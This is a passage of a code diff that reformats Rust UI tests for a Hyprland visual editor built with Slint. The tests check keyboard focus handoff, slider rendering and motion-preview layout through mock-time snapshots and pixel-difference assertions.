+        i_slint_backend_testing::TestingBackendOptions {
+            mock_time: true,
+            threading: false,
+            renderer_name: Some(slint::SharedString::from("software")),
+            ..Default::default()
+        },
+    )))
     .ok(); // allow already-initialized when tests share the thread
 
     let win = crate::MainWindow::new().unwrap();
@@ -5793,14 +6207,20 @@ fn motion_last_slider_renders_unclipped() {
         .map(|i| SharedString::from(format!("Anim {i:02}")))
         .collect();
     win.set_anim_titles(ModelRc::new(VecModel::from(titles)));
-    win.set_anim_descs(ModelRc::new(VecModel::from(
-        vec![SharedString::from("ease curve"); 19],
-    )));
-    win.set_anim_tags(ModelRc::new(VecModel::from(
-        vec![SharedString::from(""); 19],
-    )));
+    win.set_anim_descs(ModelRc::new(VecModel::from(vec![
+        SharedString::from(
+            "ease curve"
+        );
+        19
+    ])));
+    win.set_anim_tags(ModelRc::new(VecModel::from(vec![
+        SharedString::from("");
+        19
+    ])));
     win.set_anim_files(ModelRc::new(VecModel::from(
-        (0..19).map(|i| SharedString::from(format!("a{i}.lua"))).collect::<Vec<_>>(),
+        (0..19)
+            .map(|i| SharedString::from(format!("a{i}.lua")))
+            .collect::<Vec<_>>(),
     )));
     for _ in 0..80 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
@@ -5817,7 +6237,10 @@ fn motion_last_slider_renders_unclipped() {
     for _ in 0..80 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
     }
-    let lit = win.window().take_snapshot().expect("motion Y2-d lit snapshot");
+    let lit = win
+        .window()
+        .take_snapshot()
+        .expect("motion Y2-d lit snapshot");
     save_slice_png(lit.clone(), "motion_last_slider_lit.png");
 
     // Grabbed (104px): same slider engaged.
@@ -5825,7 +6248,10 @@ fn motion_last_slider_renders_unclipped() {
     for _ in 0..4 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
     }
-    let grabbed = win.window().take_snapshot().expect("motion Y2-d grabbed snapshot");
+    let grabbed = win
+        .window()
+        .take_snapshot()
+        .expect("motion Y2-d grabbed snapshot");
     save_slice_png(grabbed.clone(), "motion_last_slider_grabbed.png");
 
     let diff_top_lit = count_buffer_diff(&top, &lit);
@@ -5898,7 +6324,10 @@ fn motion_speed_and_style_stops_render() {
     // Selecting another family must visibly move the segmented highlight.
     win.set_anim_style("fade".into());
     settle_frames(80);
-    let fade = win.window().take_snapshot().expect("motion style fade snapshot");
+    let fade = win
+        .window()
+        .take_snapshot()
+        .expect("motion style fade snapshot");
     save_slice_png(fade.clone(), "motion_style_fade_selected.png");
     assert!(
         count_buffer_diff(&style, &fade) > 100,
@@ -5932,10 +6361,15 @@ fn motion_style_row_has_a_fourth_slidefade_button_that_selects() {
         SharedString::from("Stylized 2.5D"),
     ])));
     win.set_anim_descs(ModelRc::new(VecModel::from(vec![
-        SharedString::from("ease curve");
+        SharedString::from(
+            "ease curve"
+        );
         3
     ])));
-    win.set_anim_tags(ModelRc::new(VecModel::from(vec![SharedString::from(""); 3])));
+    win.set_anim_tags(ModelRc::new(VecModel::from(vec![
+        SharedString::from("");
+        3
+    ])));
     win.set_anim_files(ModelRc::new(VecModel::from(vec![
         SharedString::from("17_ease.lua"),
         SharedString::from("18_spring.lua"),
@@ -5969,7 +6403,10 @@ fn motion_style_row_has_a_fourth_slidefade_button_that_selects() {
     // matches its name.
     win.set_anim_style("slidefade 20%".into());
     settle_frames(80);
-    let shot = win.window().take_snapshot().expect("slidefade selected snapshot");
+    let shot = win
+        .window()
+        .take_snapshot()
+        .expect("slidefade selected snapshot");
     save_slice_png(shot, "motion_style_slidefade_selected.png");
 
     assert!(
@@ -6031,7 +6468,10 @@ fn motion_curve_preview_lives_in_tune_pane_at_full_width() {
     win.set_panel_section(2); // Motion
     settle_frames(80);
 
-    let shot = win.window().take_snapshot().expect("motion tune pane snapshot");
+    let shot = win
+        .window()
+        .take_snapshot()
+        .expect("motion tune pane snapshot");
     save_slice_png(shot.clone(), "motion_curve_preview_tune_pane.png");
 
     // The panel content starts at x=161 and the two-column Motion split sits at
@@ -6047,14 +6487,20 @@ fn motion_curve_preview_lives_in_tune_pane_at_full_width() {
         px0 >= RIGHT,
         "the preview must live in the right (tune) pane, not the shared header — x0={px0}"
     );
-    assert!(py0 < 360, "the preview must sit at the TOP of the tune pane — y0={py0}");
+    assert!(
+        py0 < 360,
+        "the preview must sit at the TOP of the tune pane — y0={py0}"
+    );
     let width = px1 - px0 + 1;
     assert!(
         width > 700,
         "the preview must span the tune pane's content width (~845px), not the old \
          260px header box — got {width}px (x {px0}..{px1})"
     );
-    assert!(width < 1000, "the preview must not overflow the pane — got {width}px");
+    assert!(
+        width < 1000,
+        "the preview must not overflow the pane — got {width}px"
+    );
 }
 
 /// Same preview contract in the STACKED layout (window below the 852px
@@ -6089,7 +6535,10 @@ fn motion_curve_preview_stacked_spans_the_tune_pane() {
     win.set_panel_section(2);
     settle_frames(80);
 
-    let shot = win.window().take_snapshot().expect("motion stacked snapshot");
+    let shot = win
+        .window()
+        .take_snapshot()
+        .expect("motion stacked snapshot");
     save_slice_png(shot.clone(), "motion_curve_preview_stacked.png");
 
     let (px0, _py0, px1, _py1) = first_color_band_bbox(
@@ -6163,15 +6612,21 @@ fn focus_open_system_panel() -> crate::MainWindow {
     win.set_home_about_short("Hyprland Visual Editor makes your desktop truly yours.".into());
     win.set_home_about_full("HVE is a graphical app.".into());
     win.set_home_about_tree_label("Project structure".into());
-    win.set_home_about_tree_paths(ModelRc::new(VecModel::from(vec![SharedString::from("a/b")])));
-    win.set_home_about_tree_descs(ModelRc::new(VecModel::from(vec![SharedString::from("desc a")])));
+    win.set_home_about_tree_paths(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "a/b",
+    )])));
+    win.set_home_about_tree_descs(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "desc a",
+    )])));
     win.set_home_about_tree_path_max("a/b".into());
     win.set_home_about_docs_label("View documentation".into());
     // Production-equivalent rail wiring (main.rs on_panel_section_selected):
     // a rail click drives the Rust-owned panel section.
     let w = win.as_weak();
     win.on_panel_section_selected(move |section| {
-        let Some(w) = w.upgrade() else { return; };
+        let Some(w) = w.upgrade() else {
+            return;
+        };
         w.set_panel_section(section);
     });
     for _ in 0..80 {
@@ -6218,8 +6673,10 @@ fn focus_press_key(win: &crate::MainWindow, key: slint::platform::Key) {
     use slint::ComponentHandle as _;
     let text: slint::SharedString = key.into();
     use slint::platform::WindowEvent;
-    win.window().dispatch_event(WindowEvent::KeyPressed { text: text.clone() });
-    win.window().dispatch_event(WindowEvent::KeyReleased { text });
+    win.window()
+        .dispatch_event(WindowEvent::KeyPressed { text: text.clone() });
+    win.window()
+        .dispatch_event(WindowEvent::KeyReleased { text });
     for _ in 0..2 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
     }
@@ -6229,11 +6686,13 @@ fn focus_press_key(win: &crate::MainWindow, key: slint::platform::Key) {
 /// for character keys (`i` opens the Slider's info face, the way a real
 /// keyboard delivers a letter).
 fn focus_press_text(win: &crate::MainWindow, text: &str) {
-    use slint::ComponentHandle as _;
     use slint::platform::WindowEvent;
+    use slint::ComponentHandle as _;
     let text: slint::SharedString = text.into();
-    win.window().dispatch_event(WindowEvent::KeyPressed { text: text.clone() });
-    win.window().dispatch_event(WindowEvent::KeyReleased { text });
+    win.window()
+        .dispatch_event(WindowEvent::KeyPressed { text: text.clone() });
+    win.window()
+        .dispatch_event(WindowEvent::KeyReleased { text });
     for _ in 0..2 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
     }
@@ -6245,14 +6704,18 @@ fn focus_press_text(win: &crate::MainWindow, text: &str) {
 /// `modifiers.control` — the test drives the real keyboard path instead of
 /// faking the modifier on a property.
 fn focus_press_key_with_ctrl(win: &crate::MainWindow, key: slint::platform::Key) {
-    use slint::ComponentHandle as _;
     use slint::platform::WindowEvent;
+    use slint::ComponentHandle as _;
     let ctrl: slint::SharedString = slint::platform::Key::Control.into();
     let text: slint::SharedString = key.into();
-    win.window().dispatch_event(WindowEvent::KeyPressed { text: ctrl.clone() });
-    win.window().dispatch_event(WindowEvent::KeyPressed { text: text.clone() });
-    win.window().dispatch_event(WindowEvent::KeyReleased { text });
-    win.window().dispatch_event(WindowEvent::KeyReleased { text: ctrl });
+    win.window()
+        .dispatch_event(WindowEvent::KeyPressed { text: ctrl.clone() });
+    win.window()
+        .dispatch_event(WindowEvent::KeyPressed { text: text.clone() });
+    win.window()
+        .dispatch_event(WindowEvent::KeyReleased { text });
+    win.window()
+        .dispatch_event(WindowEvent::KeyReleased { text: ctrl });
     for _ in 0..2 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
     }
@@ -6273,7 +6736,7 @@ fn focus_settle() {
 /// `menu-active` state switches which side owns the cursor.
 #[test]
 fn system_rail_handoff_returns_focus_to_content() {
-    use slint::{ComponentHandle as _, platform::Key};
+    use slint::{platform::Key, ComponentHandle as _};
     let win = focus_open_system_panel();
     let toggles = std::rc::Rc::new(std::cell::RefCell::new(Vec::new()));
     let w = win.as_weak();
@@ -6291,7 +6754,10 @@ fn system_rail_handoff_returns_focus_to_content() {
     // pattern: no zone border, so icy comes from row marks only (~3200).
     let base = win.window().take_snapshot().expect("base snapshot");
     let base_icy = count_icy_pixels(&base);
-    assert!(base_icy > 200, "system content must start focused, icy={base_icy}");
+    assert!(
+        base_icy > 200,
+        "system content must start focused, icy={base_icy}"
+    );
 
     // Left hands focus to the rail (production spatial model).
     focus_press_key(&win, Key::LeftArrow);
@@ -6309,7 +6775,10 @@ fn system_rail_handoff_returns_focus_to_content() {
     let back = win.window().take_snapshot().expect("handoff snapshot");
     save_slice_png(back.clone(), "system_focus_handoff.png");
     let back_icy = count_icy_pixels(&back);
-    assert!(back_icy > 200, "content must refocus after re-entering, icy={back_icy}");
+    assert!(
+        back_icy > 200,
+        "content must refocus after re-entering, icy={back_icy}"
+    );
     assert_eq!(win.get_panel_section(), 4, "section must stay System");
 
     // Keyboard drives the content row again (row 0 toggles system).
@@ -6440,7 +6909,7 @@ fn system_compound_rows_engage_and_pick_with_arrows() {
 #[test]
 fn system_engaged_row_esc_disengages_before_back() {
     use slint::platform::Key;
-    
+
     let win = focus_open_system_panel();
     let backs = std::rc::Rc::new(std::cell::RefCell::new(0usize));
     win.on_panel_back({
@@ -6460,11 +6929,7 @@ fn system_engaged_row_esc_disengages_before_back() {
     );
 
     focus_press_key(&win, Key::Escape);
-    assert_eq!(
-        *backs.borrow(),
-        1,
-        "Esc after disengaging must go back"
-    );
+    assert_eq!(*backs.borrow(), 1, "Esc after disengaging must go back");
 }
 
 /// Engaged visual: the focused compound row swaps its icy ring for the
@@ -6530,7 +6995,7 @@ fn system_retardo_stops_are_visually_distinct() {
 #[test]
 fn rail_arrows_preview_section_live() {
     use slint::platform::Key;
-    
+
     let win = focus_open_system_panel(); // starts on System (4), content mode
     assert_eq!(win.get_panel_section(), 4, "panel must start on System");
 
@@ -6567,7 +7032,7 @@ fn rail_arrows_preview_section_live() {
 #[test]
 fn engaged_borders_slider_down_exits_and_moves_row() {
     use slint::platform::Key;
-    
+
     use slint::{ModelRc, SharedString, VecModel};
     let win = focus_open_system_panel();
     win.set_border_titles(ModelRc::new(VecModel::from(vec![
@@ -6621,7 +7086,7 @@ fn engaged_borders_slider_down_exits_and_moves_row() {
 #[test]
 fn engaged_motion_slider_down_exits_and_moves_row() {
     use slint::platform::Key;
-    
+
     use slint::{ModelRc, SharedString, VecModel};
     let win = focus_open_system_panel();
     win.set_anim_titles(ModelRc::new(VecModel::from(vec![
@@ -6653,9 +7118,9 @@ fn engaged_motion_slider_down_exits_and_moves_row() {
     focus_press_key(&win, Key::DownArrow);
     focus_press_key(&win, Key::DownArrow);
     focus_press_key(&win, Key::Return); // engage first bezier slider
-    // Cards-first: index 2 is the first tune stop (list-len = 2), and it must
-    // engage bezier-a, not a tune-first sibling. Right proves WHICH slider
-    // grabbed before ↓ exits it.
+                                        // Cards-first: index 2 is the first tune stop (list-len = 2), and it must
+                                        // engage bezier-a, not a tune-first sibling. Right proves WHICH slider
+                                        // grabbed before ↓ exits it.
     let before_a = win.get_bezier_a();
     focus_press_key(&win, Key::RightArrow);
     assert!(
@@ -6917,15 +7382,28 @@ fn motion_curve_preview_stays_fixed_in_tune_pane_when_scrolled() {
         .map(|i| SharedString::from(format!("Anim {i:02}")))
         .collect();
     win.set_anim_titles(ModelRc::new(VecModel::from(titles)));
-    win.set_anim_descs(ModelRc::new(VecModel::from(vec![SharedString::from("ease curve"); 19])));
-    win.set_anim_tags(ModelRc::new(VecModel::from(vec![SharedString::from(""); 19])));
+    win.set_anim_descs(ModelRc::new(VecModel::from(vec![
+        SharedString::from(
+            "ease curve"
+        );
+        19
+    ])));
+    win.set_anim_tags(ModelRc::new(VecModel::from(vec![
+        SharedString::from("");
+        19
+    ])));
     win.set_anim_files(ModelRc::new(VecModel::from(
-        (0..19).map(|i| SharedString::from(format!("a{i}.lua"))).collect::<Vec<_>>(),
+        (0..19)
+            .map(|i| SharedString::from(format!("a{i}.lua")))
+            .collect::<Vec<_>>(),
     )));
     win.set_panel_section(2);
     win.set_panel_kbd_preview_index(-1);
     settle_frames(20);
-    let top = win.window().take_snapshot().expect("motion preview top snapshot");
+    let top = win
+        .window()
+        .take_snapshot()
+        .expect("motion preview top snapshot");
     save_slice_png(top.clone(), "motion_curve_preview_top.png");
 
     // Recovered space: the LEFT list's first card must start near the top of the
@@ -6952,7 +7430,10 @@ fn motion_curve_preview_stays_fixed_in_tune_pane_when_scrolled() {
     // ScrollView follows and scrolls to the bottom.
     win.set_panel_kbd_preview_index(19 + 6);
     settle_frames(80);
-    let scrolled = win.window().take_snapshot().expect("motion preview scrolled snapshot");
+    let scrolled = win
+        .window()
+        .take_snapshot()
+        .expect("motion preview scrolled snapshot");
     save_slice_png(scrolled.clone(), "motion_curve_preview_scrolled.png");
 
     // Locate the preview in the RIGHT (tune) pane: the first bg-card band there
@@ -7103,7 +7584,10 @@ fn motion_apply_callback_syncs_the_tune_pane() {
         .nth(1)
         .expect("the Motion apply callback must exist");
     // Bound to the callback body: up to the next handler block.
-    let body = manual.split("// ── Border preset CRUD").next().unwrap_or(manual);
+    let body = manual
+        .split("// ── Border preset CRUD")
+        .next()
+        .unwrap_or(manual);
     assert!(
         body.contains("sync_motion_tune_pane"),
         "on_panel_apply_animation must read the applied preset back into the pane"
@@ -7175,7 +7659,9 @@ fn motion_entry_focus_renders_on_first_list_card() {
     // Spanish PNG is read from.
     let proj = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"));
     let engine = crate::engine::Engine::new(&proj);
-    let animations = engine.scan("animations").expect("the animation scan must run");
+    let animations = engine
+        .scan("animations")
+        .expect("the animation scan must run");
     assert!(
         animations.len() >= 3,
         "the repo must ship the built-in animations the cards list"
@@ -7186,8 +7672,14 @@ fn motion_entry_focus_renders_on_first_list_card() {
         .iter()
         .map(|a| SharedString::from(tr_es.tr_or(&a.i18n_title, &a.raw_title)))
         .collect();
-    let tags: Vec<SharedString> = animations.iter().map(|a| SharedString::from(&a.tag)).collect();
-    let files: Vec<SharedString> = animations.iter().map(|a| SharedString::from(&a.file)).collect();
+    let tags: Vec<SharedString> = animations
+        .iter()
+        .map(|a| SharedString::from(&a.tag))
+        .collect();
+    let files: Vec<SharedString> = animations
+        .iter()
+        .map(|a| SharedString::from(&a.file))
+        .collect();
     let descs_for = |lang: &str| -> Vec<SharedString> {
         let tr = crate::tr::Tr::with_lang(lang);
         animations
@@ -7210,7 +7702,10 @@ fn motion_entry_focus_renders_on_first_list_card() {
     win.set_anim_files(ModelRc::new(VecModel::from(files)));
     win.set_anim_descs(ModelRc::new(VecModel::from(es_descs.clone())));
     settle_frames(80);
-    let es = win.window().take_snapshot().expect("spanish built-in descriptions");
+    let es = win
+        .window()
+        .take_snapshot()
+        .expect("spanish built-in descriptions");
     save_slice_png(es.clone(), "motion_builtin_descs_es.png");
 
     // (2) Descriptions emptied, everything else untouched: the list MUST
@@ -7218,7 +7713,10 @@ fn motion_entry_focus_renders_on_first_list_card() {
     let blank: Vec<SharedString> = animations.iter().map(|_| SharedString::from("")).collect();
     win.set_anim_descs(ModelRc::new(VecModel::from(blank)));
     settle_frames(80);
-    let es_blank = win.window().take_snapshot().expect("spanish list, descriptions emptied");
+    let es_blank = win
+        .window()
+        .take_snapshot()
+        .expect("spanish list, descriptions emptied");
     save_slice_png(es_blank.clone(), "motion_builtin_descs_es_blank.png");
     let painted = frame_diff(&es, &es_blank, MOTION_LIST_AREA);
     assert!(
@@ -7231,7 +7729,10 @@ fn motion_entry_focus_renders_on_first_list_card() {
     // the painted text follows the model's language instead of a constant.
     win.set_anim_descs(ModelRc::new(VecModel::from(en_descs)));
     settle_frames(80);
-    let es_en = win.window().take_snapshot().expect("spanish list, english descriptions");
+    let es_en = win
+        .window()
+        .take_snapshot()
+        .expect("spanish list, english descriptions");
     save_slice_png(es_en.clone(), "motion_builtin_descs_es_en_descs.png");
     let relang = frame_diff(&es, &es_en, MOTION_LIST_AREA);
     assert!(
@@ -7275,7 +7776,10 @@ fn motion_save_form_focus_renders_ring() {
     // last tune stop after the four bezier sliders, speed and style).
     win.set_panel_kbd_preview_index(3 + 6);
     settle_frames(80);
-    let save = win.window().take_snapshot().expect("motion save form snapshot");
+    let save = win
+        .window()
+        .take_snapshot()
+        .expect("motion save form snapshot");
     save_slice_png(save.clone(), "motion_save_form_focus.png");
 
     // Same scroll position, no cursor: clearing the focus keeps the tune's
@@ -7283,7 +7787,10 @@ fn motion_save_form_focus_renders_ring() {
     // only pixel difference in its band.
     win.set_panel_kbd_preview_index(-1);
     settle_frames(80);
-    let idle = win.window().take_snapshot().expect("motion save form idle snapshot");
+    let idle = win
+        .window()
+        .take_snapshot()
+        .expect("motion save form idle snapshot");
     save_slice_png(idle.clone(), "motion_save_form_idle.png");
 
     // The save form is the lower block of the tune (right) pane. Sampling its
@@ -7319,14 +7826,17 @@ fn motion_save_form_focus_renders_ring() {
     );
 
     // The user-list header only renders with at least one user preset.
-    win.set_user_animation_preset_names(ModelRc::new(VecModel::from(vec![
-        SharedString::from("Curva suave"),
-    ])));
-    win.set_user_animation_preset_tags(ModelRc::new(VecModel::from(vec![
-        SharedString::from("CUSTOM"),
-    ])));
+    win.set_user_animation_preset_names(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "Curva suave",
+    )])));
+    win.set_user_animation_preset_tags(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "CUSTOM",
+    )])));
     settle_frames(8);
-    let es_user = win.window().take_snapshot().expect("motion user list spanish");
+    let es_user = win
+        .window()
+        .take_snapshot()
+        .expect("motion user list spanish");
     save_slice_png(es_user.clone(), "motion_user_list_es.png");
     let user_diff = count_buffer_diff(&es_snap, &es_user);
     assert!(
@@ -7342,7 +7852,10 @@ fn motion_save_form_focus_renders_ring() {
     win.set_user_animation_preset_names(ModelRc::new(VecModel::from(Vec::<SharedString>::new())));
     win.set_user_animation_preset_tags(ModelRc::new(VecModel::from(Vec::<SharedString>::new())));
     settle_frames(8);
-    let es_empty = win.window().take_snapshot().expect("motion empty list spanish");
+    let es_empty = win
+        .window()
+        .take_snapshot()
+        .expect("motion empty list spanish");
     save_slice_png(es_empty.clone(), "motion_empty_es.png");
     let empty_diff = count_buffer_diff(&es_user, &es_empty);
     assert!(
@@ -7359,7 +7872,10 @@ fn panel_rail_cursor_and_content_dimming_render() {
     use slint::ComponentHandle as _;
     let win = focus_open_system_panel();
 
-    let content = win.window().take_snapshot().expect("content focus snapshot");
+    let content = win
+        .window()
+        .take_snapshot()
+        .expect("content focus snapshot");
     save_slice_png(content.clone(), "panel_content_focus.png");
 
     focus_press_key(&win, Key::LeftArrow); // rail owns the cursor
@@ -7379,8 +7895,8 @@ fn panel_rail_cursor_and_content_dimming_render() {
 /// gone.
 #[test]
 fn activation_and_about_single_focus_border_by_construction() {
-    let comp = std::fs::read_to_string("ui/components.slint")
-        .expect("ui/components.slint must exist");
+    let comp =
+        std::fs::read_to_string("ui/components.slint").expect("ui/components.slint must exist");
     assert!(
         comp.contains("in property <bool> focused"),
         "ActivationCard/AccordionCard must take a `focused` flag so the card itself draws the focus border"
@@ -7453,7 +7969,10 @@ fn panel_section_switch_routes_and_focuses() {
     assert_eq!(win.get_panel_section(), 1, "switch must reach Borders");
     let borders = win.window().take_snapshot().expect("borders snapshot");
     let borders_icy = count_icy_pixels(&borders);
-    assert!(borders_icy > 1000, "fresh Borders must own focus, icy={borders_icy}");
+    assert!(
+        borders_icy > 1000,
+        "fresh Borders must own focus, icy={borders_icy}"
+    );
     win.set_panel_section(4);
     for _ in 0..20 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
@@ -7461,42 +7980,60 @@ fn panel_section_switch_routes_and_focuses() {
     assert_eq!(win.get_panel_section(), 4, "switch must return to System");
     let system = win.window().take_snapshot().expect("system snapshot");
     let system_icy = count_icy_pixels(&system);
-    assert!(system_icy > 200, "fresh System must own focus, icy={system_icy}");
+    assert!(
+        system_icy > 200,
+        "fresh System must own focus, icy={system_icy}"
+    );
 }
 
 /// Same handoff contract on Filters: Left hands the cursor to the rail and
 /// Enter re-enters the section, returning the icy ring to the content.
 #[test]
 fn filters_rail_handoff_returns_focus_to_content() {
-    use slint::{ComponentHandle as _, ModelRc, SharedString, VecModel};
     use slint::platform::Key;
+    use slint::{ComponentHandle as _, ModelRc, SharedString, VecModel};
     let win = focus_open_system_panel();
     win.set_panel_section(3);
-    win.set_shader_titles(ModelRc::new(VecModel::from(vec![SharedString::from("Glitch")])));
-    win.set_shader_descs(ModelRc::new(VecModel::from(vec![SharedString::from("rgb split")])));
+    win.set_shader_titles(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "Glitch",
+    )])));
+    win.set_shader_descs(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "rgb split",
+    )])));
     win.set_shader_tags(ModelRc::new(VecModel::from(vec![SharedString::from("")])));
-    win.set_shader_files(ModelRc::new(VecModel::from(vec![SharedString::from("glitch.lua")])));
+    win.set_shader_files(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "glitch.lua",
+    )])));
     for _ in 0..20 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
     }
 
     let base = win.window().take_snapshot().expect("filters base");
     let base_icy = count_icy_pixels(&base);
-    assert!(base_icy > 1000, "filters content must start focused, icy={base_icy}");
+    assert!(
+        base_icy > 1000,
+        "filters content must start focused, icy={base_icy}"
+    );
 
     focus_press_key(&win, Key::LeftArrow);
     focus_settle();
     let stolen = win.window().take_snapshot().expect("filters stolen");
     save_slice_png(stolen.clone(), "filters_focus_stolen.png");
     let stolen_icy = count_icy_pixels(&stolen);
-    assert!(stolen_icy < base_icy / 2, "rail must steal filters focus, icy={stolen_icy} vs {base_icy}");
+    assert!(
+        stolen_icy < base_icy / 2,
+        "rail must steal filters focus, icy={stolen_icy} vs {base_icy}"
+    );
 
     focus_press_key(&win, Key::Return);
     focus_settle();
     let back = win.window().take_snapshot().expect("filters handoff");
     save_slice_png(back.clone(), "filters_focus_handoff.png");
     let back_icy = count_icy_pixels(&back);
-    assert!(back_icy > 1000, "filters must refocus after re-entering, icy={back_icy}");
+    assert!(
+        back_icy > 1000,
+        "filters must refocus after re-entering, icy={back_icy}"
+    );
     assert_eq!(win.get_panel_section(), 3, "section must stay Filters");
 }
 
@@ -7608,10 +8145,18 @@ fn system_row_click_handlers_refocus_by_construction() {
         "root.mouse-row = 4;",
         "root.mouse-row = 5;",
     ] {
-        assert!(src.contains(row), "SystemSection must contain `{row}` (mouse-only)");
+        assert!(
+            src.contains(row),
+            "SystemSection must contain `{row}` (mouse-only)"
+        );
     }
     // No mouse handler may move keyboard focus
-    for marker in ["root.focused-row = 1;", "root.focused-row = 3;", "root.focused-row = 4;", "root.focused-row = 5;"] {
+    for marker in [
+        "root.focused-row = 1;",
+        "root.focused-row = 3;",
+        "root.focused-row = 4;",
+        "root.focused-row = 5;",
+    ] {
         // These would be old focus-stealing wiring; ensure they are gone from mouse handlers
         // We check that the file does NOT contain focused-row assignment inside a clicked handler
         // (focused-row only moves via keyboard Down/Up/Return, not via mouse)
@@ -7622,7 +8167,10 @@ fn system_row_click_handlers_refocus_by_construction() {
     // No mouse handler may touch focus — kb is keyboard-only, so the
     // mouse can never toggle any zone highlight.
     for line in src.lines() {
-        if (line.contains("clicked =>") || line.contains("toggled(") || line.contains("toggled =>") || line.contains("open-docs =>"))
+        if (line.contains("clicked =>")
+            || line.contains("toggled(")
+            || line.contains("toggled =>")
+            || line.contains("open-docs =>"))
             && !line.trim_start().starts_with("//")
         {
             assert!(
@@ -7637,7 +8185,12 @@ fn system_row_click_handlers_refocus_by_construction() {
         src.contains("property <int> mouse-row: -1;"),
         "SystemSection must own a mouse-row mark independent from focused-row"
     );
-    for mark in ["root.mouse-row == 1", "root.mouse-row == 3", "root.mouse-row == 4", "root.mouse-row == 5"] {
+    for mark in [
+        "root.mouse-row == 1",
+        "root.mouse-row == 3",
+        "root.mouse-row == 4",
+        "root.mouse-row == 5",
+    ] {
         assert!(src.contains(mark), "row highlights must include `{mark}`");
     }
     // Hover moves ONLY the mouse mark (pure visual, zero layout):
@@ -7664,7 +8217,10 @@ fn system_row_click_handlers_refocus_by_construction() {
             );
         }
     }
-    assert!(hover_follows >= 10, "every row hover must follow the mouse, got {hover_follows}");
+    assert!(
+        hover_follows >= 10,
+        "every row hover must follow the mouse, got {hover_follows}"
+    );
 
     let filters = std::fs::read_to_string("ui/panel/sections/FiltersSection.slint")
         .expect("FiltersSection.slint must exist");
@@ -7679,23 +8235,31 @@ fn system_row_click_handlers_refocus_by_construction() {
     );
 
     // 1:1 legacy: mouse NEVER moves keyboard focus — rail items only change section.
-    let menu = std::fs::read_to_string("ui/panel/PanelMenu.slint")
-        .expect("PanelMenu.slint must exist");
+    let menu =
+        std::fs::read_to_string("ui/panel/PanelMenu.slint").expect("PanelMenu.slint must exist");
     for i in 0..5 {
         let needle = format!("root.section-selected({i});");
-        assert!(menu.contains(&needle), "PanelMenu must contain `{needle}` (mouse act-only)");
+        assert!(
+            menu.contains(&needle),
+            "PanelMenu must contain `{needle}` (mouse act-only)"
+        );
     }
     // No mouse handler may move menu-index (keyboard owns it)
     for line in menu.lines() {
         if line.contains("selected =>") && !line.trim_start().starts_with("//") {
-            assert!(!line.contains("menu-index"), "PanelMenu mouse selected must NOT move menu-index: {line}");
+            assert!(
+                !line.contains("menu-index"),
+                "PanelMenu mouse selected must NOT move menu-index: {line}"
+            );
         }
     }
 
     // The ActivationCard switch must be clickable (sized TouchArea).
-    let comp = std::fs::read_to_string("ui/components.slint")
-        .expect("ui/components.slint must exist");
-    let start = comp.find("export component ActivationCard").expect("ActivationCard must exist");
+    let comp =
+        std::fs::read_to_string("ui/components.slint").expect("ui/components.slint must exist");
+    let start = comp
+        .find("export component ActivationCard")
+        .expect("ActivationCard must exist");
     let block = &comp[start..(start + 6000).min(comp.len())];
     let flat: String = block.chars().filter(|c| !c.is_whitespace()).collect();
     assert!(
@@ -7757,7 +8321,9 @@ fn borders_mouse_converges_keyboard_focus_by_construction() {
         "SavedPresetCard body click must emit focus-requested(root.index)"
     );
     for line in src.lines() {
-        if (line.contains("clicked =>") || line.contains("toggled") || line.contains("focus-requested"))
+        if (line.contains("clicked =>")
+            || line.contains("toggled")
+            || line.contains("focus-requested"))
             && !line.trim_start().starts_with("//")
         {
             assert!(
@@ -7766,8 +8332,8 @@ fn borders_mouse_converges_keyboard_focus_by_construction() {
             );
         }
     }
-    let root = std::fs::read_to_string("ui/panel/PanelRoot.slint")
-        .expect("PanelRoot.slint must exist");
+    let root =
+        std::fs::read_to_string("ui/panel/PanelRoot.slint").expect("PanelRoot.slint must exist");
     assert!(
         root.contains("focus-requested(idx) => { root.borders-focused-index = idx; }"),
         "PanelRoot must move borders-focused-index on the section's focus-requested"
@@ -7846,14 +8412,16 @@ fn filters_mouse_converges_keyboard_focus_by_construction() {
         code.contains("callback focus-requested(int);"),
         "FiltersSection must declare a section-level focus-requested(int)"
     );
-    let card = std::fs::read_to_string("ui/components.slint")
-        .expect("ui/components.slint must exist");
+    let card =
+        std::fs::read_to_string("ui/components.slint").expect("ui/components.slint must exist");
     assert!(
         card.contains("root.focus-requested(root.index)"),
         "PresetCard body click must emit focus-requested(root.index)"
     );
     for line in src.lines() {
-        if (line.contains("clicked =>") || line.contains("toggled") || line.contains("focus-requested"))
+        if (line.contains("clicked =>")
+            || line.contains("toggled")
+            || line.contains("focus-requested"))
             && !line.trim_start().starts_with("//")
         {
             assert!(
@@ -7862,8 +8430,8 @@ fn filters_mouse_converges_keyboard_focus_by_construction() {
             );
         }
     }
-    let root = std::fs::read_to_string("ui/panel/PanelRoot.slint")
-        .expect("PanelRoot.slint must exist");
+    let root =
+        std::fs::read_to_string("ui/panel/PanelRoot.slint").expect("PanelRoot.slint must exist");
     assert!(
         root.contains("focus-requested(idx) => { root.filters-focused-index = idx; }"),
         "PanelRoot must move filters-focused-index on the section's focus-requested"
@@ -7890,7 +8458,10 @@ fn filters_scroll_follows_keyboard_only_by_construction() {
         "public function follow-focus()",
         "hover-moves-focus: false;",
     ] {
-        assert!(src.contains(marker), "FiltersSection must contain scroll-follow wiring: {marker}");
+        assert!(
+            src.contains(marker),
+            "FiltersSection must contain scroll-follow wiring: {marker}"
+        );
     }
     assert!(
         src.contains("if (root.has-focus) {"),
@@ -7959,7 +8530,9 @@ fn motion_mouse_converges_keyboard_focus_by_construction() {
         "SavedPresetCard body click must emit focus-requested(root.index)"
     );
     for line in src.lines() {
